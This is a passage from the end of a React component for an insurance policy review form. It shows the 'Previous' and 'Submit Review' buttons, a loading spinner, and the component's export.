                className="bg-gray-200 text-gray-700 py-3 px-8 rounded-lg font-semibold hover:bg-gray-300 transition flex items-center"
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Previous
              </button>
              <button
                onClick={handleSubmit}
                disabled={loading}
                className="bg-green-600 text-white py-3 px-8 rounded-lg font-semibold hover:bg-green-700 transition flex items-center disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {loading ? (
                  <>
                    <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2" />
                    Submitting...
                  </>
                ) : (
                  <>
                    <CheckCircle2 className="w-4 h-4 mr-2" />
                    Submit Review
                  </>
                )}
              </button>
            </div>
          </div>
        )}
      </main>
    </div>
  );
};

export default InsurancePolicyReview;
